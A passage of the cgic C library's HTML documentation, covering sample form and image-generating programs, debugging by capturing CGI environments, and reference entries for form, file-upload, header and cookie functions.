fprintf(cgiOut, \"&lt;option value=\\\"Red\\\"&gt;Red\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"Green\\\"&gt;Green\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"Blue\\\"&gt;Blue\\n\");\n  fprintf(cgiOut, \"&lt;/select&gt;\\n\");\n  fprintf(cgiOut, \"&lt;br&gt;\\n\");\n  fprintf(cgiOut, \"Multiple-SELECT\\n\");\n  fprintf(cgiOut, \"&lt;br&gt;\\n\");\n  fprintf(cgiOut, \"&lt;select name=\\\"flavors\\\" multiple&gt;\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"pistachio\\\"&gt;Pistachio\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"walnut\\\"&gt;Walnut\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"creme\\\"&gt;Creme\\n\");\n  fprintf(cgiOut, \"&lt;/select&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Exclusive Radio Button Group: Age of \"\n    \"Truck in Years\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"1\\\"&gt;1\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"2\\\"&gt;2\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"3\\\" checked&gt;3\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"4\\\"&gt;4\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Nonexclusive Checkbox Group: \"\n    \"Voting for Zero through Four Candidates\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"A\\\"&gt;A\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"B\\\"&gt;B\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"C\\\"&gt;C\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"D\\\"&gt;D\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;File Upload:\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"file\\\" name=\\\"file\\\" \"\n    \"value=\\\"\\\"&gt; (Select A Local File)\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Set a Cookie&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input name=\\\"cname\\\" \"\n    \"value=\\\"\\\"&gt; Cookie Name\\n\");\n  fprintf(cgiOut, \"&lt;input name=\\\"cvalue\\\" \"\n    \"value=\\\"\\\"&gt; Cookie Value&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"submit\\\" \"\n    \"name=\\\"testcgic\\\" value=\\\"Submit Request\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"reset\\\" \"\n    \"value=\\\"Reset Request\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Save the CGI Environment&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Pressing this button will submit the form, then \"\n    \"save the CGI environment so that it can be replayed later \"\n    \"by calling cgiReadEnvironment (in a debugger, for \"\n    \"instance).&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"submit\\\" name=\\\"saveenvironment\\\" \"\n    \"value=\\\"Save Environment\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;/form&gt;\\n\");\n}\n</pre>\nNote the use of <code>enctype=\"multipart/form-data\"</code> in the\n<code>FORM</code> tag. This is absolutely required if the form\nwill contain file upload fields, as in the above example. Most\nbrowsers will not even attempt file uploads without the\npresence of this attribute.\n<h4>Examining CGI environment variables</h4>\nThe CGI standard specifies a number of environment variables\nwhich are set by the server. However, servers are somewhat\nunpredictable as to whether these variables will be null or\npoint to empty strings when an environment variable is not set.\nAlso, in order to allow the programmer to restore saved\nCGI environments, the cgic library needs have a way of insulating\nthe programmer from the actual environment variables.\n<p>\nInstead of calling getenv() to determine the value of a\nvariable such as HTTP_USER_AGENT (the browser software being used),\nalways use the\n<a href=\"#variables\">cgic copies of the environment variables</a>,\nwhich are always valid C strings (they are never null, although\nthey may point to an empty string). For instance, the cgic\nvariable containing the name of the browser software is\n<a href=\"#cgiUserAgent\">cgiUserAgent</a>. The referring URL appears\nin the variable <a href=\"#cgiReferrer\">cgiReferrer</a>.\n<h3><a name=\"images\">How can I generate images from my cgic application?</a></h3>\ncgic can be used in conjunction with the\n<a href=\"https://libgd.github.io/\">gd graphics library</a>, which\ncan produce GIF images on the fly.\n<p>\nThe following short sample program hints at the possibilities:\n<pre>\n#include \"cgic.h\"\n#include \"gd.h\"\n\nchar *colors[] = {\n  \"red\", \"green\", \"blue\"\n};\n\n#define colorsTotal 3\n\nint cgiMain() {\n  int colorChosen;\n  gdImagePtr im;\n  int r, g, b;\n  /* Use gd to create an image */\n  im = gdImageCreate(64, 64);\n  r = gdImageColorAllocate(im, 255, 0, 0);  \n  g = gdImageColorAllocate(im, 0, 255, 0);  \n  b = gdImageColorAllocate(im, 0, 0, 255);  \n  /* Now use cgic to find out what color the user requested */\n  <a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle</a>(\"color\", 3, &amp;colorChosen, 0);  \n  /* Now fill with the desired color */\n  switch(colorChosen) {\n    case 0:\n    gdImageFill(im, 32, 32, r);\n    break;\n    case 1:\n    gdImageFill(im, 32, 32, g);\n    break;\n    case 2:\n    gdImageFill(im, 32, 32, b);\n    break;\n  }  \n  /* Now output the image. Note the content type! */\n  cgiHeaderContentType(\"image/gif\");\n  /* Send the image to cgiOut */\n  gdImageGif(im, cgiOut);\n  /* Free the gd image */\n  gdImageDestroy(im);\n  return 0;\n}\n</pre>\nNote that this program would need to be linked with both cgic.o\nand libgd.a. Often programs of this type respond to one\ncgiPathInfo value or set of form fields by returning an HTML page \nwith an inline image reference that, in turn, generates a GIF image.\n<h3><a name=\"debug\">Debugging CGI applications: using capture</a></h3>\nDebugging CGI applications can be a painful task. Since CGI applications\nrun in a special environment created by the web server, it is difficult\nto execute them in a debugger. However, the cgic library provides a way \nof capturing \"live\" CGI environments to a file, and also provides a way\nto reload saved environments. \n<p>\nThe provided program 'capture.c' can be used to capture CGI\nenvironments. Just change the first line of the cgiMain() function\nof capture.c to save the CGI environment to a filename appropriate\non your system and type 'make capture'. Then place capture in your\ncgi directory and set the form action or other link you want to test\nto point to it. When the form submission or other link takes place,\ncapture will write the CGI environment active at that time to\nthe filename you specified in the source. The\n<a href=\"#cgiReadEnvironment\">cgiReadEnvironment()</a> function can then \nbe invoked on the same filename at the beginning of the cgiMain() function \nof the application you want to test in order to restore the captured \nenvironment.  You can then execute your program in the debugger of your choice,\nand it should perform exactly as it would have performed had\nit been launched by the actual web server, including file uploads,\ncookies and all other phenomena within the purview of cgic.\n<p>\n<strong>Important:</strong> Make sure you specify the full path, as the\ncurrent working directory of a CGI script may not be what you\nthink it is!\n<p>\n<strong>Even More Important:</strong> If you call getenv() yourself\nin your code, instead of using the provided <a href=\"#variables\">\ncgic copies of the CGI environment variables</a>, you will\n<em>not</em> get the values you expect when running with\na saved CGI environment. Always use the cgic variables instead\nof calling getenv().\n<h3><a name=\"functions\">cgic function reference</a></h3>\n<dl>\n<br><dt><strong><a name=\"cgiFormString\">cgiFormResultType cgiFormString(\n  char *name, char *result, int max)</a>\n</strong><br><dd>cgiFormString attempts to retrieve the string sent for the\n  specified input field. The text will be copied into\n  the buffer specified by result, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string. Regardless of the newline\n  format submitted by the browser, cgiFormString always\n  encodes each newline as a single line feed (ascii decimal 10); as\n  a result the final string may be slightly shorter than indicated\n  by a call to <a href=\"#cgiFormStringSpaceNeeded\">\n  cgiFormStringSpaceNeeded</a> but will never be longer.\n  cgiFormString returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if the string was \n  successfully retrieved, \n  <a href=\"#cgiFormTruncated\">cgiFormTruncated</a> if the string was\n  retrieved but was truncated to fit the buffer,\n  cgiFormEmpty if the string was \n  retrieved but was empty, and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no \n  such input field was submitted. In the last case, \n  an empty string is copied to result. \n<br><br><dt><strong><a name=\"cgiFormStringNoNewlines\">\ncgiFormResultType cgiFormStringNoNewlines(\n  char *name, char *result, int max)</a>\n</strong><br><dd>\ncgiFormStringNoNewlines() is exactly equivalent to <a href=\"#cgiFormString\">\n  cgiFormString()</a>, except\n  that any carriage returns or line feeds that occur in the input\n  will be stripped out. The use of this function is recommended\n  for single-line text input fields, as some browsers will submit\n  carriage returns and line feeds when they should not. \n<br><br><dt><strong><a name=\"cgiFormStringSpaceNeeded\">\ncgiFormResultType cgiFormStringSpaceNeeded(\n  char *name, int *length)</a>\n</strong><br><dd>\ncgiFormStringSpaceNeeded() is used to determine the length of the input text \n  buffer needed to receive the contents of the specified input field. \n  This is useful if the programmer wishes to allocate sufficient memory \n  for input of arbitrary length. The actual length of the string \n  retrieved by a subsequent call to cgiFormString() may be slightly shorter\n  but will never be longer than *result. On success, cgiFormStringSpaceNeeded() \n  sets the value pointed to by length to the number of bytes of data, \n  including the terminating null, and returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a>. If no \n  value was submitted for the specified field, cgiFormStringSpaceNeeded sets \n  the value pointed to by length to 1 and returns <a href=\"#cgiFormNotFound\">cgiFormNotFound</a>. 1 is\n  set to ensure space for an empty string (a single null\n  character) if cgiFormString is called despite the return value.\n\n<br><br><dt><strong><a name=\"cgiFormStringMultiple\">cgiFormResultType cgiFormStringMultiple(\n  char *name, char ***ptrToStringArray)</a>\n</strong><br><dd>cgiFormStringMultiple is useful in the unusual case in which several\n  input elements in the form have the same name and, for whatever\n  reason, the programmer does not wish to use the checkbox, radio \n  button and selection menu functions provided below. This is\n  occasionally needed if the programmer cannot know \n  in advance what values might appear in a multiple-selection list\n  or group of checkboxes on a form. The value pointed to\n  by result will be set to a pointer to an array of strings; the last\n  entry in the array will be a null pointer.  This array is allocated \n  by the CGI library. Important: when done working with the array,\n  you must call cgiStringArrayFree() with the array pointer as the \n  argument.  cgiFormStringMultiple() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if at least\n  one occurrence of the name is found, <a href=\"#cgiFormNotFound\">cgiFormNotFound</a>\n  if no occurrences are found, or cgiFormMemory if not enough\n  memory is available to allocate the array to be returned.\n  In all cases except the last, ptrToStringArray is set to point to a \n  valid array of strings, with the last element in the array being a \n  null pointer; in the out-of-memory case ptrToStringArray is set to \n  a null pointer.\n\n<br><br><dt><strong><a name=\"cgiFormEntries\">cgiFormResultType cgiFormEntries(\n  char ***ptrToStringArray)</a>\n</strong><br><dd>cgiFormEntries is useful when the programmer cannot know the names\n  of all relevant form fields in advance. The value pointed to\n  by result will be set to a pointer to an array of strings; the last\n  entry in the array will be a null pointer.  This array is allocated \n  by the CGI library. Important: when done working with the array,\n  you must call cgiStringArrayFree() with the array pointer as the \n  argument. cgiFormEntries() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> except in the event of an out of memory error.\n  On success, ptrToStringArray is set to point to a \n  valid array of strings, with the last element in the array being a \n  null pointer; in the out-of-memory case ptrToStringArray is set to \n  a null pointer, and \n  <a href=\"#cgiFormOutOfMemory\">cgiFormOutOfMemory</a> is returned.\n\n<br><br><dt><strong><a name=\"cgiStringArrayFree\">void cgiStringArrayFree(char **stringArray)\n</a>\n</strong><br><dd>\ncgiStringArrayFree() is used to free the memory associated with\n  a string array created by \n  <a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()</a>,\n  <a href=\"#cgiFormEntries\">cgiFormEntries()</a>, or\n  <a href=\"#cgiFormCookies\">cgiFormCookies()</a>.\n<br><br><dt><strong><a name=\"cgiFormInteger\">cgiFormResultType cgiFormInteger(\n  char *name, int *result, int defaultV)</a>\n</strong><br><dd>cgiFormInteger() attempts to retrieve the integer sent for the\n  specified input field. The value pointed to by result\n  will be set to the value submitted. cgiFormInteger() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  cgiFormEmpty if the value submitted is an empty string,\n  cgiFormBadType if the value submitted is not an integer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default.\n<br><br><dt><strong><a name=\"cgiFormIntegerBounded\">\ncgiFormResultType cgiFormIntegerBounded(\n  char *name, int *result, int min, int max, int defaultV)</a>\n</strong><br><dd>cgiFormIntegerBounded() attempts to retrieve the integer sent for the\n  specified input field, and constrains the result to be within\n  the specified bounds. The value pointed to by result\n  will be set to the value submitted. cgiFormIntegerBounded() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  <a href=\"#cgiFormConstrained\">cgiFormConstrained</a> if the value was out of bounds and result\n  was adjusted accordingly, <a href=\"#cgiFormEmpty\">cgiFormEmpty</a> if the value submitted is \n  an empty string, <a href=\"#cgiFormBadType\">cgiFormBadType</a> if the value submitted is not an \n  integer, and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default.\n\n<br><br><dt><strong><a name=\"cgiFormDouble\">cgiFormResultType cgiFormDouble(\n  char *name, double *result, double defaultV)</a>\n</strong><br><dd>cgiFormDouble attempts to retrieve the floating-point value sent for \n  the specified input field. The value pointed to by result\n  will be set to the value submitted. cgiFormDouble returns \n  cgiFormSuccess if the value was successfully retrieved,\n  cgiFormEmpty if the value submitted is an empty string,\n  cgiFormBadType if the value submitted is not a number,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default. \n<br><br><dt><strong><a name=\"cgiFormDoubleBounded\">\ncgiFormResultType cgiFormDoubleBounded(\n  char *name, double *result, double min, double max, \n  double defaultV)</a>\n</strong><br><dd>\ncgiFormDoubleBounded() attempts to retrieve the floating-point\n  value  sent for the specified input field, and constrains the \n  result to be within the specified bounds. The value pointed to by \n  result will be set to the value submitted. cgiFormDoubleBounded() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  <a href=\"#cgiFormConstrained\">cgiFormConstrained</a> if the value was out of bounds and result\n  was adjusted accordingly, <a href=\"#cgiFormEmpty\">cgiFormEmpty</a> if the value submitted is \n  an empty string, <a href=\"#cgiFormBadType\">cgiFormBadType</a> if the value submitted is not a \n  number, and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default. \n\n<br><br><dt><strong><a name=\"cgiFormSelectSingle\">\ncgiFormResultType cgiFormSelectSingle(\n  char *name, char **choicesText, int choicesTotal, \n  int *result, int defaultV)</a>\n</strong><br><dd>\ncgiFormSelectSingle() retrieves the selection number associated with a\n  &lt;SELECT&gt; element that does not allow multiple selections. name\n  should identify the NAME attribute of the &lt;SELECT&gt; element. choicesText \n  should point to an array of strings identifying each choice; \n  choicesTotal should indicate the total number of choices. The value \n  pointed to by result will be set to the position of the actual choice\n  selected within the choicesText array, if any, or to the value of \n  default, if no selection was submitted or an invalid selection was \n  made.  cgiFormSelectSingle() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if the value was\n  successfully retrieved, <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no selection\n  was submitted, and <a href=\"#cgiFormNoSuchChoice\">cgiFormNoSuchChoice</a> if the selection\n  does not match any of the possibilities in the choicesText array. \n<br><dt><strong>\n<a name=\"cgiFormSelectMultiple\">\ncgiFormResultType cgiFormSelectMultiple(\n  char *name, char **choicesText, int choicesTotal, \n  int *result, int *invalid)</a>\n</strong><br><dd>cgiFormSelectMultiple() retrieves the selection numbers associated with a\n  &lt;SELECT&gt; element that does allow multiple selections. name should\n  identify the NAME attribute of the &lt;SELECT&gt; element. choicesText \n  should point to an array of strings identifying each choice; \n  choicesTotal should indicate the total number of choices. result\n  should point to an array of integers with as many elements as there\n  are strings in the choicesText array. For each choice in the\n  choicesText array that is selected, the corresponding integer in\n  the result array will be set to one; other entries in the result\n  array will be set to zero. cgiFormSelectMultiple() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> \n  if at least one valid selection was successfully retrieved or\n  cgiFormNotFound if no valid selections were submitted.\n  The integer pointed to by invalid is set to the number of\n  invalid selections that were submitted, which should be zero\n  unless the form and the choicesText array do not agree.\n\n<br><br><dt><strong>\n<a name=\"cgiFormSubmitClicked\">\ncgiFormResultType cgiFormSubmitClicked(\n  char *name)</a>\n</strong><br><dd>\nIt is often desirable to know whether a particular submit button was clicked,\n  when multiple submit buttons with different name attributes exist.\n  cgiFormSubmitClicked is an alternative name for the \n  <a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle</a> function,\n  which is suitable for testing whether a particular submit button\n  was used.\n<br><br><dt><strong>\n<a name=\"cgiFormCheckboxSingle\">\ncgiFormResultType cgiFormCheckboxSingle(\n  char *name)</a>\n</strong><br><dd>\ncgiFormCheckboxSingle determines whether the checkbox with the specified name\n  is checked. cgiFormCheckboxSingle returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if the\n  button is checked, <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if the checkbox is\n  not checked. cgiFormCheckboxSingle is intended for single\n  checkboxes with a unique name; see below for functions to\n  deal with multiple checkboxes with the same name, and\n  with radio buttons.\n\n<br><br><dt><strong><a name=\"cgiFormCheckboxMultiple\">\ncgiFormResultType cgiFormCheckboxMultiple(\n  char *name, char **valuesText, int valuesTotal, \n  int *result, int *invalid)</a>\n</strong><br><dd>cgiFormCheckboxMultiple() determines which checkboxes among a group\n  of checkboxes with the same name are checked. This is distinct\n  from radio buttons (see <a href=\"#cgiFormRadio\">cgiFormRadio</a>). \n  valuesText \n  should point to an array of strings identifying the VALUE\n  attribute of each checkbox; valuesTotal should indicate the total \n  number of checkboxes. result should point to an array of integers with \n  as many elements as there are strings in the valuesText array. For \n  each choice in the valuesText array that is selected, the corresponding\n  integer in the result array will be set to one; other entries in the \n  result array will be set to zero. cgiFormCheckboxMultiple returns \n  cgiFormSuccess if at least one valid checkbox was checked or\n  cgiFormNotFound if no valid checkboxes were checked.\n  The integer pointed to by invalid is set to the number of\n  invalid selections that were submitted, which should be zero\n  unless the form and the valuesText array do not agree.\n<br><br><dt><strong><a name=\"cgiFormRadio\">\ncgiFormResultType cgiFormRadio(\n  char *name, char **valuesText, int valuesTotal, \n  int *result, int defaultV)</a>\n</strong><br><dd>cgiFormRadio() determines which, if any, of a group of radio boxes with\n  the same name was selected. valuesText should point to an array of \n  strings identifying the VALUE attribute of each radio box; \n  valuesTotal should indicate the total number of radio boxes. The value \n  pointed to by result will be set to the position of the actual choice \n  selected within the valuesText array, if any, or to the value of \n  default, if no radio box was checked or an invalid selection was \n  made. cgiFormRadio() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if a checked radio box was \n  found in the group, <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no box was checked, and \n  <a href=\"#cgiFormNoSuchChoice\">cgiFormNoSuchChoice</a> if the radio box submitted does not match any of \n  the possibilities in the valuesText array.\n\n<br><dt><strong><a name=\"cgiFormFileName\">cgiFormResultType cgiFormFileName(\n  char *name, char *fileName, int max)</a>\n</strong><br><dd>cgiFormFileName attempts to retrieve the file name uploaded by the\n  user for the specified form input field of type <code>file</code>. \n  <strong>NEVER, EVER TRUST THIS FILENAME TO BE REASONABLE AND\n  SAFE FOR DIRECT USE ON THE SERVER SIDE.</strong>\n  The text will be copied into\n  the buffer specified by fileName, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string. cgiFormFileName returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if the string was \n  successfully retrieved and was not empty,\n  <a href=\"#cgiFormNoFileName\">cgiFormNoFileName</a> if the string was \n  successfully retrieved but empty indicating that no file was uploaded,\n  <a href=\"#cgiFormTruncated\">cgiFormTruncated</a> if the string was\n  retrieved but was truncated to fit the buffer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no \n  such input field was submitted. In the last case, \n  an empty string is copied to result. \n<br><dt><strong><a name=\"cgiFormFileSize\">cgiFormResultType cgiFormFileSize(\n  char *name, int *sizeP)</a>\n</strong><br><dd>cgiFormFileSize attempts to retrieve the size, in bytes, of a\n  file uploaded by the browser in response to the\n  input field of type <code>file</code> specified by the\n  <code>name</code> parameter. On success, the size is stored\n  to *sizeP, and this function returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess</a>. If the form\n  field does not exist, this function returns \n  <a href=\"#cgiFormNotFound\">cgiFormNotFound</a>.\n  If the form field exists but no file was uploaded, this function\n  returns <a href=\"#cgiFormNotAFile\">cgiFormNotAFile</a>.\n<br><dt><strong><a name=\"cgiFormFileContentType\">cgiFormResultType cgiFormFileContentType(\n  char *name, char *contentType, int max)</a>\n</strong><br><dd>cgiFormString attempts to retrieve the content name claimed by the\n  user for the specified form input field of type <code>file</code>. \n  <strong>THERE IS NO GUARANTEE THAT THE CONTENT TYPE WILL BE\n  ACCURATE.</strong>\n  The content type string will be copied into\n  the buffer specified by contentType, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string. cgiFormFileContentType returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if the string was \n  successfully retrieved and was not empty,\n  <a href=\"#cgiFormNoContentType\">cgiFormNoContentType</a> if the string was \n  successfully retrieved but empty indicating that no file was uploaded\n  or the browser did not know the content type,\n  <a href=\"#cgiFormTruncated\">cgiFormTruncated</a> if the string was\n  retrieved but was truncated to fit the buffer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no \n  such input field was submitted. In the last case, \n  an empty string is copied to result. \n\n<br><dt><strong><a name=\"cgiFormFileOpen\">cgiFormResultType cgiFormFileOpen(\n  char *name, cgiFilePtr *cfpp)</a>\n</strong><br><dd>cgiFormFileOpen attempts to open the actual uploaded file data for\n  the specified form field of type <code>file</code>. Upon success,\n  this function returns retrieve the content name claimed by the\n  user for the specified form input field of type <code>file</code>. \n  On success, this function sets *cfpp to a valid cgiFilePtr\n  object for use with <a href=\"#cgiFormFileRead</a>cgiFormFileRead</a>\n  and returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a>.\n  On failure, this function sets *cfpp to a null pointer, and\n  returns <a href=\"#cgiFormNotFound\">cgiFormNotFound</a>,\n  <a href=\"#cgiFormNotAFile\">cgiFormNotAFile</a>,\n  <a href=\"#cgiFormMemory\">cgiFormMemory</a> or\n  <a href=\"#cgiFormIO\">cgiFormIO</a> as appropriate.\n<p>\n  See also <a href=\"#cgiFormFileRead\">cgiFormFileRead</a> \nand <a href=\"#cgiFormFileClose\">cgiFormFileClose</a>.\n<br><dt><strong><a name=\"cgiFormFileRead\">cgiFormResultType cgiFormFileRead(\n  cgiFilePtr cfp, char *buffer, int bufferSize, int *gotP)</a>\n</strong><br><dd>cgiFormFileRead attempts to read up to <code>bufferSize</code>\n  bytes from a cgiFilePtr object previously opened with\n  <a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a>. If any data\n  is successfully read, it is copied to <code>buffer</code>, \n  and the number of bytes successfully read is stored \n  to <code>*gotP</code>. This function returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if any data\n  is successfully read. At end of file, this function\n  returns <a href=\"#cgiFormEOF\">cgiFormEOF</a>. In the event\n  of an I/O error, this function returns \n  <a href=\"#cgiFormIO\">cgiFormIO</a>. If cfp is a null pointer,\n  this function returns <a href=\"#cgiFormOpenFailed\">cgiFormOpenFailed</a>.\n  <p>\n  See also <a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a> \nand <a href=\"#cgiFormFileClose\">cgiFormFileClose</a>.\n<br><dt><strong><a name=\"cgiFormFileClose\">cgiFormResultType cgiFormFileClose(\n  cgiFilePtr cfp)</a>\n</strong><br><dd>cgiFormFileClose closes a cgiFilePtr object previously opened\n  with <a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a>, freeing\n  memory and other system resources. This\n  function returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a>\n  unless cfp is null, in which case \n  <a href=\"#cgiFormOpenFailed\">cgiFormOpenFailed</a> is returned.\n<p>\n  See also <a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a> \nand <a href=\"#cgiFormFileRead\">cgiFormFileRead</a>.\n<br><br><dt><strong><a name=\"cgiHeaderLocation\">\nvoid cgiHeaderLocation(char *redirectUrl)</a>\n</strong><br><dd>\ncgiHeaderLocation() should be called if the programmer wishes to\nredirect the user to a different URL. No futher output\nis needed in this case.\n<p>\nIf you wish to set cookies,\n<strong>you must make your calls to \n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a>\nand \n<a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger</a>\n</strong> BEFORE invoking cgiHeaderLocation. \n<br><br><dt><strong><a name=\"cgiHeaderStatus\">\nvoid cgiHeaderStatus(int status, char *statusMessage)</a>\n</strong><br><dd>\ncgiHeaderStatus() should be called if the programmer wishes to\noutput an HTTP error status code instead of a document. The status\ncode is the first argument; the second argument is the status\nmessage to be displayed to the user.\n<p>\nIf you wish to set cookies,\n<strong>you must make your calls to \n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a>\nand \n<a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger</a>\n</strong> BEFORE invoking cgiHeaderStatus.\n<br><br><dt><strong><a name=\"cgiHeaderContentType\">\nvoid cgiHeaderContentType(char *mimeType)</a>\n</strong><br><dd>\ncgiHeaderContentType() should be called if the programmer wishes to\noutput a new document in response to the user's request. This is\nthe normal case. The single argument is the MIME document type\nof the response; typical values are \"text/html\" for HTML documents, \n\"text/plain\" for plain ASCII without HTML tags, \"image/gif\" for\na GIF image and \"audio/basic\" for .au-format audio.\n<p>\nIf you wish to set cookies,\n<strong>you must make your calls to \n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a>\nand \n<a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger</a>\n</strong> BEFORE invoking cgiHeaderContentType.\n<br><br><dt><strong><a name=\"cgiHeaderCookieSetString\">\nvoid cgiHeaderCookieSetString(char *name, char *value,\n  int secondsToLive, char *path, char *domain)</a>\n</strong><br><dd>\ncgiHeaderCookieSetString() should be called when the programmer wishes\nto store a piece of information in the user's browser, so that the\nstored information is again presented to the server on subsequent\naccesses to the relevant site. The first argument is the name of the\ncookie to be stored; for best results in all browsers, use a short\nname without spaces or unusual punctuation. The second argument is\nthe value of the cookie to be stored. Again, for best results, use\na short string; it is recommended that cookies be used to store a\nunique identifier which is then used to look up more detailed\ninformation in a database on the server side. Attempts to store\nelaborate information on the browser side are much more likely to fail.\nThe third argument is the number of seconds that the cookie should\nbe kept by the browser; 86400 is a single full day, 365*86400 is\nroughly one year. The fourth argument is the partial URL of the\nweb site within which the cookie is relevant. If the cookie should\nbe sent to the server for every access to the entire site, \nset this argument to <code>/</code>. The final argument is the\nweb site name or entire domain for which this cookie should be\nsubmitted; if you choose to have the cookie sent back for an\nentire domain, this argument must begin with a dot, such as\n<code>.boutell.dev</code>. The cgic variables <a name=\"#cgiScriptName</a>\nand <a name=\"#cgiServerName\">cgiServerName</a> are convenient\nvalues for the fourth and fifth arguments.\nSee also <a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger</a>,\n<a href=\"#cgiCookieString\">cgiCookieString</a>, \n<a href=\"#cgiCookieString\">cgiCookieInteger</a> and\n<a href=\"#cgiCookies\">cgiCookies</a>.\n<br><br><dt><strong><a name=\"cgiHeaderCookieSetInteger\">\nvoid cgiHeaderCookieSetInteger(char *name, int value,\n  int secondsToLive, char *path, char *domain)</a>\n</strong><br><dd>\ncgiHeaderCookieSetInteger() is identical to\n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a>,\nexcept that the value to be set is an integer rather than a string.\nSee <a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a>\nfor complete information.\n<br>\n<br><dt><strong><a name=\"cgiCookieString\">cgiFormResultType cgiCookieString(\n  char *name, char *result, int max)</a>\n</strong><br><dd>cgiFormString attempts to retrieve the string sent for the\n  specified cookie (browser-side persistent storage). The \n  text will be copied into\n  the buffer specified by result, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string.\n  cgiCookieString returns <a href=\"#cgiFormSuccess\">cgiFormSuccess</a> if the string was \n  successfully retrieved, \n  <a href=\"#cgiFormTruncated\">cgiFormTruncated</a> if the string was\n  retrieved but was truncated to fit the buffer,\n  cgiFormEmpty if the string was \n  retrieved but was empty, and <a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if no \n  such cookie was submitted. In the last case, \n  an empty string is copied to result. \n<br><br><dt><strong><a name=\"cgiCookieInteger\">cgiFormResultType cgiCookieInteger(\n  char *name, int *result, int defaultV)</a>\n  See also <a href=\"#cgiCookieString\">cgiCookieInteger</a>,\n  <a href=\"#cgiCookies\">cgiCookies</a>,\n  <a href=\"#cgiHeaderCookieSetString>cgiHeaderCookieSetString</a>, and\n  <a href=\"#cgiHeaderCookieSetInteger>cgiHeaderCookieSetInteger</a>.\n</strong><br><dd>cgiCookieInteger() 